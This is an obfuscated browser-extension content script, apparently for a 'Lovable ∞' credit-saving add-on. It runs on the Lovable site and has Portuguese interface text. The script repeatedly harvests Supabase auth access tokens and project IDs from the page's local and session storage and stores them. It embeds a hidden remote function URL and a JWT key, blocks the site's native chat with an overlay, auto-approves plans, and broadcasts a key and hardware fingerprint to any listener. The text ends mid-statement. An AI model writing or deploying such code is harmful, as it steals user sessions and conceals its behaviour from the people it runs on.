'use strict';
const _QO_URL='htt'+'ps:'+'//h'+'ckn'+'cgr'+'fhe'+'dos'+'wsd'+'kyn'+'i.s'+'upa'+'bas'+'e.c'+'o/f'+'unc'+'tio'+'ns/'+'v1/'+'opt'+'imi'+'ze-'+'pro'+'mpt',_QO_KEY=['eyJ'+'hbG'+'ciO'+'iJI'+'UzI'+'1Ni'+'I','sIn'+'R5c'+'CI6'+'Ikp'+'XVC'+'J9.'+'e','yJp'+'c3M'+'iOi'+'Jzd'+'XBh'+'YmF'+'z','ZSI'+'sIn'+'JlZ'+'iI6'+'Imh'+'ja2'+'5','jZ3'+'Jma'+'GVk'+'b3N'+'3c2'+'Rre'+'W','5pI'+'iwi'+'cm9'+'sZS'+'I6I'+'mFu'+'b','24i'+'LCJ'+'pYX'+'QiO'+'jE3'+'Nzk'+'4','MTM'+'5Nj'+'ksI'+'mV4'+'cCI'+'6Mj'+'A','5NT'+'M4O'+'Tk2'+'OX0'+'.Nc'+'miF'+'O','kEj'+'VGS'+'3oP'+'16A'+'i6p'+'Hzm'+'p','ktU'+'ShV'+'zPU'+'QYC'+'XfH'+'-dQ']['joi'+'n']('');
let _myTabId=null;
try{
const ct_n1d6359={
}
;
ct_n1d6359['act'+'ion']='get'+'MyT'+'abI'+'d',chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](ct_n1d6359,_n368ccb=>{
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'];
if(_n368ccb&&_n368ccb['tab'+'Id']!=null)_myTabId=_n368ccb['tab'+'Id'];
}
);
}
catch(ct_n523ce0){
}
function readTokenFromLocalStorage(){
const _n2258d7=[localStorage,sessionStorage];
for(const _n30816a of _n2258d7){
try{
for(let _n28acf0=0x0;
_n28acf0<_n30816a['len'+'gth'];
_n28acf0++){
const _n54de78=_n30816a['key'](_n28acf0);
if(_n54de78&&_n54de78['sta'+'rts'+'Wit'+'h']('sb-')&&_n54de78['end'+'sWi'+'th']('-au'+'th-'+'tok'+'en')){
const _n5b03b3=JSON['par'+'se'](_n30816a['get'+'Ite'+'m'](_n54de78));
if(_n5b03b3&&_n5b03b3['acc'+'ess'+'_to'+'ken'])return _n5b03b3['acc'+'ess'+'_to'+'ken'];
}
}
}
catch(_ncf885d){
}
}
return null;
}
function isTokenExpired(_n30cd65){
try{
const _n22c55f=(_n30cd65||'')['rep'+'lac'+'e'](/^Bearer\s+/i,'')['spl'+'it']('.');
if(_n22c55f['len'+'gth']!==0x3)return![];
const _n1d363e=JSON['par'+'se'](atob(_n22c55f[0x1]['rep'+'lac'+'e'](/-/g,'+')['rep'+'lac'+'e'](/_/g,'/')));
return!!(_n1d363e['exp']&&_n1d363e['exp']*0x3e8<Date['now']());
}
catch(_n9b0589){
return![];
}
}
function getProjectFromUrl(){
try{
const _n1d1aa9=window['loc'+'ati'+'on']['pat'+'hna'+'me']['mat'+'ch'](/\/projects\/([0-9a-fA-F-]{
36}
)/i)||window['loc'+'ati'+'on']['hre'+'f']['mat'+'ch'](/\/projects\/([0-9a-fA-F-]{
36}
)/i);
return _n1d1aa9?_n1d1aa9[0x1]:null;
}
catch(_n42280b){
return null;
}
}
function saveToStorage(_n11e9a6,_n597d9a){
return new Promise(_n2b6dc7=>{
try{
if(typeof chrome==='und'+'efi'+'ned'||!chrome['run'+'tim'+'e']?.['id']){
_n2b6dc7();
return;
}
const _n16459c={
}
;
_n11e9a6&&typeof _n11e9a6==='str'+'ing'&&(_n16459c['lov'+'abl'+'e_t'+'oke'+'n']=_n11e9a6['rep'+'lac'+'e'](/^Bearer\s+/i,'')['tri'+'m']());
_n597d9a&&typeof _n597d9a==='str'+'ing'&&(_n16459c['lov'+'abl'+'e_p'+'roj'+'ect'+'Id']=_n597d9a);
if(_myTabId!=null){
if(_n16459c['lov'+'abl'+'e_t'+'oke'+'n'])_n16459c['lov'+'_to'+'k_'+_myTabId]=_n16459c['lov'+'abl'+'e_t'+'oke'+'n'];
if(_n16459c['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'])_n16459c['lov'+'_pi'+'d_'+_myTabId]=_n16459c['lov'+'abl'+'e_p'+'roj'+'ect'+'Id'];
}
if(!Object['key'+'s'](_n16459c)['len'+'gth']){
_n2b6dc7();
return;
}
chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n16459c,()=>_n2b6dc7());
}
catch(_naa95a5){
_n2b6dc7();
}
}
);
}
setInterval(function(){
try{
const _n433323=readTokenFromLocalStorage(),_ndfbb22=getProjectFromUrl();
if(_n433323||_ndfbb22)saveToStorage(_n433323,_ndfbb22);
}
catch(_n24fd7f){
}
}
,0x7d0),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('vis'+'ibi'+'lit'+'ych'+'ang'+'e',function(){
if(document['vis'+'ibi'+'lit'+'ySt'+'ate']==='vis'+'ibl'+'e')try{
const _n402111=readTokenFromLocalStorage(),_n5e35cd=getProjectFromUrl();
if(_n402111||_n5e35cd)saveToStorage(_n402111,_n5e35cd);
}
catch(_n33b87b){
}
}
);
let _creditModal=null,_creditWarningAllowed=![];
function _showCreditWarningModal(_n4d796b){
if(_creditModal){
try{
_creditModal['rem'+'ove']();
}
catch(_n2204b5){
}
_creditModal=null;
}
const _n19da2f=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n19da2f['id']='__q'+'l_c'+'red'+'it_'+'war'+'n__',_n19da2f['set'+'Att'+'rib'+'ute']('sty'+'le',['pos'+'iti'+'on:'+'fix'+'ed','top'+':0','lef'+'t:0','rig'+'ht:'+'0','bot'+'tom'+':0','z-i'+'nde'+'x:2'+'147'+'483'+'647','dis'+'pla'+'y:f'+'lex','ali'+'gn-'+'ite'+'ms:'+'cen'+'ter','jus'+'tif'+'y-c'+'ont'+'ent'+':ce'+'nte'+'r','bac'+'kgr'+'oun'+'d:r'+'gba'+'(0,'+'0,0'+',0.'+'78)','bac'+'kdr'+'op-'+'fil'+'ter'+':bl'+'ur('+'8px'+')','-we'+'bki'+'t-b'+'ack'+'dro'+'p-f'+'ilt'+'er:'+'blu'+'r(8'+'px)','fon'+'t-f'+'ami'+'ly:'+'-ap'+'ple'+'-sy'+'ste'+'m,B'+'lin'+'kMa'+'cSy'+'ste'+'mFo'+'nt,'+'\x22Se'+'goe'+'\x20UI'+'\x22,R'+'obo'+'to,'+'san'+'s-s'+'eri'+'f','pad'+'din'+'g:2'+'0px','box'+'-si'+'zin'+'g:b'+'ord'+'er-'+'box']['joi'+'n'](';
')),_n19da2f['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+['bac'+'kgr'+'oun'+'d:#'+'131'+'31f','bor'+'der'+':1.'+'5px'+'\x20so'+'lid'+'\x20rg'+'ba('+'239'+',68'+',68'+',0.'+'55)','bor'+'der'+'-ra'+'diu'+'s:2'+'2px','pad'+'din'+'g:3'+'2px'+'\x2028'+'px\x20'+'26p'+'x','max'+'-wi'+'dth'+':40'+'0px','wid'+'th:'+'100'+'%','box'+'-sh'+'ado'+'w:0'+'\x200\x20'+'0\x201'+'px\x20'+'rgb'+'a(2'+'39,'+'68,'+'68,'+'0.1'+'5),'+'0\x202'+'4px'+'\x2064'+'px\x20'+'rgb'+'a(0'+',0,'+'0,0'+'.7)'+',0\x20'+'0\x205'+'0px'+'\x20rg'+'ba('+'239'+',68'+',68'+',0.'+'08)','tex'+'t-a'+'lig'+'n:c'+'ent'+'er','pos'+'iti'+'on:'+'rel'+'ati'+'ve']['joi'+'n'](';
')+'\x22>'+('<di'+'v\x20s'+'tyl'+'e=\x22'+'wid'+'th:'+'62p'+'x;
h'+'eig'+'ht:'+'62p'+'x;
b'+'ack'+'gro'+'und'+':rg'+'ba('+'239'+',68'+',68'+',0.'+'12)'+';
bo'+'rde'+'r:2'+'px\x20'+'sol'+'id\x20'+'rgb'+'a(2'+'39,'+'68,'+'68,'+'0.4'+'5);
'+'bor'+'der'+'-ra'+'diu'+'s:5'+'0%;
'+'dis'+'pla'+'y:f'+'lex'+';
al'+'ign'+'-it'+'ems'+':ce'+'nte'+'r;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+';
ma'+'rgi'+'n:0'+'\x20au'+'to\x20'+'18p'+'x;
f'+'ont'+'-si'+'ze:'+'30p'+'x;
\x22'+'>⚠️<'+'/di'+'v>')+('<h2'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'fff'+';
fo'+'nt-'+'siz'+'e:1'+'9px'+';
fo'+'nt-'+'wei'+'ght'+':80'+'0;
m'+'arg'+'in:'+'0\x200'+'\x2010'+'px;
'+'let'+'ter'+'-sp'+'aci'+'ng:'+'-0.'+'3px'+';
li'+'ne-'+'hei'+'ght'+':1.'+'25;
'+'\x22>E'+'xte'+'nsã'+'o\x20D'+'esa'+'tiv'+'ada'+'!</'+'h2>')+('<p\x20'+'sty'+'le='+'\x22co'+'lor'+':#a'+'0a0'+'b8;
'+'fon'+'t-s'+'ize'+':13'+'.5p'+'x;
l'+'ine'+'-he'+'igh'+'t:1'+'.65'+';
ma'+'rgi'+'n:0'+'\x200\x20'+'6px'+';
\x22>'+'A\x20e'+'xte'+'nsã'+'o\x20<'+'str'+'ong'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'e2e'+'2f0'+';
\x22>'+'Lov'+'abl'+'e\x20∞'+'</s'+'tro'+'ng>'+'\x20fo'+'i\x20d'+'esa'+'tiv'+'ada'+'\x20au'+'tom'+'ati'+'cam'+'ent'+'e.<'+'/p>')+('<p\x20'+'sty'+'le='+'\x22co'+'lor'+':#a'+'0a0'+'b8;
'+'fon'+'t-s'+'ize'+':13'+'.5p'+'x;
l'+'ine'+'-he'+'igh'+'t:1'+'.65'+';
ma'+'rgi'+'n:0'+'\x200\x20'+'20p'+'x;
\x22'+'>Se'+'\x20co'+'nti'+'nua'+'r\x20a'+'gor'+'a,\x20'+'sua'+'\x20me'+'nsa'+'gem'+'\x20se'+'rá\x20'+'env'+'iad'+'a\x20<'+'str'+'ong'+'\x20st'+'yle'+'=\x22c'+'olo'+'r:#'+'f87'+'171'+';
\x22>'+'dir'+'eta'+'men'+'te\x20'+'par'+'a\x20a'+'\x20Lo'+'vab'+'le<'+'/st'+'ron'+'g>\x20'+'e\x20i'+'rá\x20'+'<st'+'ron'+'g\x20s'+'tyl'+'e=\x22'+'col'+'or:'+'#f8'+'717'+'1;
\x22'+'>ga'+'sta'+'r\x20s'+'eus'+'\x20cr'+'édi'+'tos'+'</s'+'tro'+'ng>'+'.</'+'p>')+('<di'+'v\x20s'+'tyl'+'e=\x22'+'bac'+'kgr'+'oun'+'d:r'+'gba'+'(23'+'9,6'+'8,6'+'8,0'+'.08'+');
b'+'ord'+'er:'+'1px'+'\x20so'+'lid'+'\x20rg'+'ba('+'239'+',68'+',68'+',0.'+'22)'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'12p'+'x;
p'+'add'+'ing'+':11'+'px\x20'+'14p'+'x;
m'+'arg'+'in-'+'bot'+'tom'+':24'+'px;
'+'\x22>')+('<p\x20'+'sty'+'le='+'\x22co'+'lor'+':#f'+'ca5'+'a5;
'+'fon'+'t-s'+'ize'+':12'+'px;
'+'mar'+'gin'+':0;
'+'lin'+'e-h'+'eig'+'ht:'+'1.5'+'5;
\x22'+'>💡\x20'+'Rec'+'ome'+'nda'+'mos'+'\x20ca'+'nce'+'lar'+'\x20e\x20'+'atu'+'ali'+'zar'+'\x20a\x20'+'pág'+'ina'+'.\x20A'+'\x20ex'+'ten'+'são'+'\x20vo'+'lta'+'rá\x20'+'a\x20p'+'rot'+'ege'+'r\x20s'+'eus'+'\x20cr'+'édi'+'tos'+'\x20au'+'tom'+'ati'+'cam'+'ent'+'e.<'+'/p>')+('</d'+'iv>')+('<bu'+'tto'+'n\x20i'+'d=\x22'+'__q'+'l_c'+'w_r'+'elo'+'ad_'+'_\x22\x20'+'sty'+'le='+'\x22di'+'spl'+'ay:'+'blo'+'ck;
'+'wid'+'th:'+'100'+'%;
b'+'ack'+'gro'+'und'+':li'+'nea'+'r-g'+'rad'+'ien'+'t(1'+'35d'+'eg,'+'#16'+'a34'+'a,#'+'158'+'03d'+');
c'+'olo'+'r:#'+'fff'+';
bo'+'rde'+'r:n'+'one'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'13p'+'x;
p'+'add'+'ing'+':14'+'px\x20'+'20p'+'x;
f'+'ont'+'-si'+'ze:'+'15p'+'x;
f'+'ont'+'-we'+'igh'+'t:8'+'00;
'+'cur'+'sor'+':po'+'int'+'er;
'+'mar'+'gin'+'-bo'+'tto'+'m:1'+'0px'+';
bo'+'x-s'+'had'+'ow:'+'0\x204'+'px\x20'+'18p'+'x\x20r'+'gba'+'(22'+',16'+'3,7'+'4,0'+'.35'+');
l'+'ett'+'er-'+'spa'+'cin'+'g:-'+'0.2'+'px;
'+'\x22>✓'+'\x20Ca'+'nce'+'lar'+'\x20e\x20'+'Atu'+'ali'+'zar'+'\x20Pá'+'gin'+'a</'+'but'+'ton'+'>')+('<bu'+'tto'+'n\x20i'+'d=\x22'+'__q'+'l_c'+'w_g'+'o__'+'\x22\x20s'+'tyl'+'e=\x22'+'dis'+'pla'+'y:b'+'loc'+'k;
w'+'idt'+'h:1'+'00%'+';
ba'+'ckg'+'rou'+'nd:'+'tra'+'nsp'+'are'+'nt;
'+'col'+'or:'+'#f8'+'717'+'1;
b'+'ord'+'er:'+'1px'+'\x20so'+'lid'+'\x20rg'+'ba('+'239'+',68'+',68'+',0.'+'35)'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'13p'+'x;
p'+'add'+'ing'+':11'+'px\x20'+'20p'+'x;
f'+'ont'+'-si'+'ze:'+'12.'+'5px'+';
fo'+'nt-'+'wei'+'ght'+':50'+'0;
c'+'urs'+'or:'+'poi'+'nte'+'r;
o'+'pac'+'ity'+':0.'+'85;
'+'let'+'ter'+'-sp'+'aci'+'ng:'+'0;
\x22'+'>Co'+'nti'+'nua'+'r\x20m'+'esm'+'o\x20a'+'ssi'+'m\x20e'+'\x20ga'+'sta'+'r\x20m'+'eus'+'\x20cr'+'édi'+'tos'+'</b'+'utt'+'on>')+('</d'+'iv>'),document['bod'+'y']['app'+'end'+'Chi'+'ld'](_n19da2f),_creditModal=_n19da2f,_n19da2f['que'+'ryS'+'ele'+'cto'+'r']('#__'+'ql_'+'cw_'+'rel'+'oad'+'__')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
try{
_n19da2f['rem'+'ove']();
}
catch(_n22f859){
}
_creditModal=null,window['loc'+'ati'+'on']['rel'+'oad']();
}
),_n19da2f['que'+'ryS'+'ele'+'cto'+'r']('#__'+'ql_'+'cw_'+'go_'+'_')['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
try{
_n19da2f['rem'+'ove']();
}
catch(_n433047){
}
_creditModal=null;
if(typeof _n4d796b==='fun'+'cti'+'on')_n4d796b();
}
);
}
(function(){
function _n406c59(){
try{
const _n439f50=readTokenFromLocalStorage(),_n5c2863=getProjectFromUrl();
if(_n439f50||_n5c2863)saveToStorage(_n439f50,_n5c2863);
}
catch(_n565383){
}
}
_n406c59(),setTimeout(_n406c59,0x5dc),setTimeout(_n406c59,0xbb8),setTimeout(_n406c59,0x157c);
}
());
function _qlFindChatPanel(){
const _n4db855=window['loc'+'ati'+'on']['pat'+'hna'+'me']+window['loc'+'ati'+'on']['sea'+'rch'];
if(!/\/projects\/[0-9a-fA-F-]{
8,}
/i['tes'+'t'](_n4db855))return null;
const _n214606=document['que'+'ryS'+'ele'+'cto'+'r']('for'+'m#c'+'hat'+'-in'+'put');
if(_n214606)return _n214606;
const _n1a5f5f=document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('tex'+'tar'+'ea,'+'\x20[c'+'ont'+'ent'+'edi'+'tab'+'le]');
for(const _n1c14c5 of _n1a5f5f){
const _nb64017=_n1c14c5['get'+'Att'+'rib'+'ute']('pla'+'ceh'+'old'+'er')||'';
if(/ask lovable|lovable/i['tes'+'t'](_nb64017)){
let _n274a61=_n1c14c5['par'+'ent'+'Ele'+'men'+'t'];
while(_n274a61&&_n274a61!==document['bod'+'y']){
if(_n274a61['tag'+'Nam'+'e']==='FOR'+'M')return _n274a61;
const _n4f3d09=_n274a61['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
if(_n4f3d09['hei'+'ght']>0x96)break;
_n274a61=_n274a61['par'+'ent'+'Ele'+'men'+'t'];
}
return _n1c14c5['par'+'ent'+'Ele'+'men'+'t'];
}
}
return null;
}
function _qlInjectShield(){
if(document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_s'+'hie'+'ld_'+'_'))return;
const _n5d5842=_qlFindChatPanel(),_n37b430=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n37b430['id']='__q'+'l_s'+'hie'+'ld_'+'_';
if(_n5d5842){
const _nf6ed66=_n5d5842['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect'](),_n4d9d43=_nf6ed66['wid'+'th'];
_n37b430['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
'+('top'+':')+_nf6ed66['top']+('px!'+'imp'+'ort'+'ant'+';
')+('lef'+'t:')+_nf6ed66['lef'+'t']+('px!'+'imp'+'ort'+'ant'+';
')+('wid'+'th:')+_n4d9d43+('px!'+'imp'+'ort'+'ant'+';
')+('hei'+'ght'+':')+_nf6ed66['hei'+'ght']+('px!'+'imp'+'ort'+'ant'+';
')+('bac'+'kgr'+'oun'+'d:r'+'gba'+'(10'+',10'+',20'+',0.'+'92)'+'!im'+'por'+'tan'+'t;
')+('z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
')+('dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
f'+'lex'+'-di'+'rec'+'tio'+'n:c'+'olu'+'mn!'+'imp'+'ort'+'ant'+';
')+('ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
')+('gap'+':8p'+'x!i'+'mpo'+'rta'+'nt;
'+'poi'+'nte'+'r-e'+'ven'+'ts:'+'all'+'!im'+'por'+'tan'+'t;
c'+'urs'+'or:'+'not'+'-al'+'low'+'ed!'+'imp'+'ort'+'ant'+';
')+('fon'+'t-f'+'ami'+'ly:'+'san'+'s-s'+'eri'+'f!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+'-ra'+'diu'+'s:0'+'!im'+'por'+'tan'+'t;
');
const _n2239bd=new ResizeObserver(()=>{
const _n1377e4=_n5d5842['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
_n37b430['sty'+'le']['top']=_n1377e4['top']+'px',_n37b430['sty'+'le']['lef'+'t']=_n1377e4['lef'+'t']+'px',_n37b430['sty'+'le']['wid'+'th']=_n1377e4['wid'+'th']+'px',_n37b430['sty'+'le']['hei'+'ght']=_n1377e4['hei'+'ght']+'px';
}
);
_n2239bd['obs'+'erv'+'e'](_n5d5842),_n37b430['_ql'+'RO']=_n2239bd;
}
else _n37b430['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
bo'+'tto'+'m:0'+'!im'+'por'+'tan'+'t;
l'+'eft'+':0!'+'imp'+'ort'+'ant'+';
'+('wid'+'th:'+'340'+'px!'+'imp'+'ort'+'ant'+';
he'+'igh'+'t:1'+'20p'+'x!i'+'mpo'+'rta'+'nt;
')+('bac'+'kgr'+'oun'+'d:r'+'gba'+'(10'+',10'+',20'+',0.'+'92)'+'!im'+'por'+'tan'+'t;
')+('z-i'+'nde'+'x:2'+'147'+'483'+'647'+'!im'+'por'+'tan'+'t;
')+('dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
f'+'lex'+'-di'+'rec'+'tio'+'n:c'+'olu'+'mn!'+'imp'+'ort'+'ant'+';
')+('ali'+'gn-'+'ite'+'ms:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'cen'+'ter'+'!im'+'por'+'tan'+'t;
')+('gap'+':12'+'px!'+'imp'+'ort'+'ant'+';
po'+'int'+'er-'+'eve'+'nts'+':al'+'l!i'+'mpo'+'rta'+'nt;
'+'cur'+'sor'+':no'+'t-a'+'llo'+'wed'+'!im'+'por'+'tan'+'t;
')+('fon'+'t-f'+'ami'+'ly:'+'san'+'s-s'+'eri'+'f!i'+'mpo'+'rta'+'nt;
');
_n37b430['inn'+'erH'+'TML']='<di'+'v\x20s'+'tyl'+'e=\x22'+'fon'+'t-s'+'ize'+':28'+'px;
'+'lin'+'e-h'+'eig'+'ht:'+'1\x22>'+'🛡️</'+'div'+'>'+('<di'+'v\x20s'+'tyl'+'e=\x22'+'col'+'or:'+'#ff'+'f;
f'+'ont'+'-si'+'ze:'+'13p'+'x;
f'+'ont'+'-we'+'igh'+'t:7'+'00;
'+'let'+'ter'+'-sp'+'aci'+'ng:'+'.06'+'em\x22'+'>ES'+'CUD'+'O\x20A'+'TIV'+'O</'+'div'+'>')+('<di'+'v\x20s'+'tyl'+'e=\x22'+'col'+'or:'+'rgb'+'a(2'+'55,'+'255'+',25'+'5,.'+'5);
'+'fon'+'t-s'+'ize'+':10'+'px;
'+'tex'+'t-a'+'lig'+'n:c'+'ent'+'er;
'+'pad'+'din'+'g:0'+'\x2012'+'px\x22'+'>Ch'+'at\x20'+'nat'+'ivo'+'\x20bl'+'oqu'+'ead'+'o\x20·'+'\x20De'+'sat'+'ive'+'\x20pe'+'lo\x20'+'pai'+'nel'+'</d'+'iv>'),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n37b430);
}
function _qlRemoveShield(){
const _n1c2d5d=document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_s'+'hie'+'ld_'+'_');
if(_n1c2d5d){
if(_n1c2d5d['_ql'+'RO'])_n1c2d5d['_ql'+'RO']['dis'+'con'+'nec'+'t']();
_n1c2d5d['rem'+'ove']();
}
}
try{
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'shi'+'eld'+'_ac'+'tiv'+'e'],function(_n2406bd){
if(_n2406bd&&_n2406bd['ql_'+'shi'+'eld'+'_ac'+'tiv'+'e'])_qlInjectShield();
}
);
}
catch(ct_n3a20af){
}
(function(){
var _n14d664={
}
;
window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('mes'+'sag'+'e',function(_n5675be){
if(_n5675be['sou'+'rce']!==window||!_n5675be['dat'+'a'])return;
if(_n5675be['dat'+'a']['typ'+'e']==='__Q'+'L_P'+'LAN'+'_DE'+'TEC'+'TED'+'__'){
var _n3be844=_n5675be['dat'+'a']['id']||'',_n3d4129=_n5675be['dat'+'a']['con'+'ten'+'t']||'';
if(_n3be844&&_n3d4129)try{
typeof chrome!=='und'+'efi'+'ned'&&chrome['sto'+'rag'+'e']&&chrome['sto'+'rag'+'e']['loc'+'al']&&(chrome['sto'+'rag'+'e']['loc'+'al']['set']({
'ql_pending_plan':{
'id':_n3be844,'content':_n3d4129,'ts':_n5675be['dat'+'a']['ts']||Date['now']()}
}
),console['log']('[Co'+'nte'+'nt]'+'\x20📌\x20'+'Pla'+'no\x20'+'pen'+'den'+'te\x20'+'sal'+'vo\x20'+'no\x20'+'sto'+'rag'+'e\x20|'+'\x20id'+':',_n3be844['sli'+'ce'](0x0,0xc)));
}
catch(_n48a86e){
}
return;
}
if(_n5675be['dat'+'a']['typ'+'e']==='__Q'+'L_N'+'ATI'+'VE_'+'SEN'+'D_B'+'LOC'+'KED'+'__'){
_showCreditWarningModal(function(){
try{
const _n35b2b3={
}
;
_n35b2b3['typ'+'e']='__Q'+'L_S'+'ET_'+'GUA'+'RD_'+'_',_n35b2b3['blo'+'ck']=![],window['pos'+'tMe'+'ssa'+'ge'](_n35b2b3,'*');
}
catch(_n30a652){
}
_creditWarningAllowed=!![];
try{
var _ne1766b=findSendButton(_form);
if(_ne1766b)_ne1766b['cli'+'ck']();
}
catch(_n90d460){
}
setTimeout(function(){
_creditWarningAllowed=![];
if(!_active)try{
const _n16e7d8={
}
;
_n16e7d8['typ'+'e']='__Q'+'L_S'+'ET_'+'GUA'+'RD_'+'_',_n16e7d8['blo'+'ck']=!![],window['pos'+'tMe'+'ssa'+'ge'](_n16e7d8,'*');
}
catch(_n42cb66){
}
}
,0x9c4);
}
);
return;
}
if(_n5675be['dat'+'a']['typ'+'e']!=='__Q'+'L_P'+'LAN'+'_AP'+'PRO'+'VAL'+'__')return;
var _n4958ee=_n5675be['dat'+'a']['con'+'ten'+'t']||'',_n8be1ca=_n5675be['dat'+'a']['id']||_n5675be['dat'+'a']['too'+'l_c'+'all'+'_ev'+'ent'+'_id']||'';
if(!_n4958ee||!_n8be1ca)return;
if(_n14d664[_n8be1ca])return;
_n14d664[_n8be1ca]=!![],setTimeout(function(){
delete _n14d664[_n8be1ca];
}
,0x15f90);
try{
if(typeof chrome==='und'+'efi'+'ned'||!chrome['run'+'tim'+'e']||!chrome['run'+'tim'+'e']['id'])return;
const _n2290ad={
}
;
_n2290ad['act'+'ion']='pla'+'nAp'+'pro'+'val',_n2290ad['con'+'ten'+'t']=_n4958ee,_n2290ad['id']=_n8be1ca,_n2290ad['tab'+'Id']=_myTabId,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n2290ad,function(_n4ef06a){
void chrome['run'+'tim'+'e']['las'+'tEr'+'ror'],_n4ef06a&&_n4ef06a['ok']?console['log']('[Co'+'nte'+'nt]'+'\x20✅\x20'+'Pla'+'n\x20a'+'uto'+'-ap'+'rov'+'ado'+'!\x20i'+'d:',_n8be1ca):console['war'+'n']('[Co'+'nte'+'nt]'+'\x20⚠\x20'+'Pla'+'n\x20a'+'ppr'+'ova'+'l\x20f'+'alh'+'ou:',_n4ef06a&&_n4ef06a['err'+'or']);
}
);
}
catch(_n1f5218){
}
}
);
}
()),(function(){
window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('mes'+'sag'+'e',function(_n3f1053){
if(_n3f1053['sou'+'rce']!==window||!_n3f1053['dat'+'a'])return;
if(_n3f1053['dat'+'a']['typ'+'e']==='__Q'+'L_S'+'ESS'+'ION'+'_HE'+'ADE'+'RS_'+'_')try{
var _n417dfe={
}
;
if(_n3f1053['dat'+'a']['ses'+'sio'+'nId'])_n417dfe['ql_'+'bro'+'wse'+'r_s'+'ess'+'ion'+'_id']=_n3f1053['dat'+'a']['ses'+'sio'+'nId'];
if(_n3f1053['dat'+'a']['git'+'Sha'])_n417dfe['ql_'+'git'+'_sh'+'a']=_n3f1053['dat'+'a']['git'+'Sha'];
Object['key'+'s'](_n417dfe)['len'+'gth']&&typeof chrome!=='und'+'efi'+'ned'&&chrome['sto'+'rag'+'e']&&chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n417dfe);
}
catch(_n424919){
}
if(_n3f1053['dat'+'a']['typ'+'e']==='__Q'+'L_I'+'NIT'+'_PA'+'YLO'+'AD_'+'_'&&_n3f1053['dat'+'a']['pay'+'loa'+'d'])try{
if(typeof chrome==='und'+'efi'+'ned'||!chrome['sto'+'rag'+'e'])return;
const _n1ba5b0={
}
;
_n1ba5b0['lov'+'abl'+'e_c'+'hat'+'_pa'+'ylo'+'ads']=[],chrome['sto'+'rag'+'e']['loc'+'al']['get'](_n1ba5b0,function(_n53e52b){
var _n5d3d7d=_n53e52b['lov'+'abl'+'e_c'+'hat'+'_pa'+'ylo'+'ads']||[];
if(_n5d3d7d['len'+'gth']===0x0){
_n5d3d7d['pus'+'h']({
'timestamp':Date['now'](),'url':'','body':_n3f1053['dat'+'a']['pay'+'loa'+'d'],'synthetic':!![]}
);
const _n252915={
}
;
_n252915['lov'+'abl'+'e_c'+'hat'+'_pa'+'ylo'+'ads']=_n5d3d7d,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n252915),console['log']('[QL'+'\x20co'+'nte'+'nt]'+'\x20pa'+'ylo'+'ad\x20'+'sin'+'tét'+'ico'+'\x20in'+'ici'+'al\x20'+'arm'+'aze'+'nad'+'o\x20|'+'\x20pa'+'ge:',_n3f1053['dat'+'a']['pay'+'loa'+'d']['cur'+'ren'+'t_p'+'age'],'|\x20v'+'iew'+'por'+'t:',_n3f1053['dat'+'a']['pay'+'loa'+'d']['cur'+'ren'+'t_v'+'iew'+'por'+'t_w'+'idt'+'h']+'x'+_n3f1053['dat'+'a']['pay'+'loa'+'d']['cur'+'ren'+'t_v'+'iew'+'por'+'t_h'+'eig'+'ht']);
}
}
);
}
catch(_nde7ccc){
}
}
);
}
());
function _relayFixKey(){
try{
if(typeof chrome==='und'+'efi'+'ned'||!chrome['sto'+'rag'+'e'])return;
chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'ck','ql_'+'hw_'+'fp_'+'v2'],function(_n3b4074){
try{
const _n12b83f={
}
;
_n12b83f['typ'+'e']='__Q'+'L_F'+'IX_'+'KEY'+'__',_n12b83f['key']=_n3b4074&&_n3b4074['ql_'+'ck']||null,_n12b83f['hwi'+'d']=_n3b4074&&_n3b4074['ql_'+'hw_'+'fp_'+'v2']||'',window['pos'+'tMe'+'ssa'+'ge'](_n12b83f,'*');
}
catch(_n1da219){
}
}
);
}
catch(_n44ac3a){
}
}
_relayFixKey(),setTimeout(_relayFixKey,0x5dc),setTimeout(_relayFixKey,0xfa0);
try{
